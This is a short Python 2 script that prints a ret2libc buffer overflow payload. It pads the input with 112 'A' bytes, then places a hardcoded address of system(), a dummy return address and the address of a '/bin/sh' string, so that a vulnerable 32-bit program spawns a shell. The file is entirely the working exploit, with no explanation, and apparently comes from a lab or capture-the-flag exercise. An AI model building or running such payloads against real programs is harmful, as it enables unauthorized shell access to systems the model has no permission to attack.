import struct

system_addr = struct.pack("<I",0xb7e0ca20) # Address of system
exit_addr = struct.pack("<I",0xd3adc0d3)   # Dummy address
arg_addr = struct.pack("<I",0xb7f47c0a)    # Address of /bin/sh

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

print buf
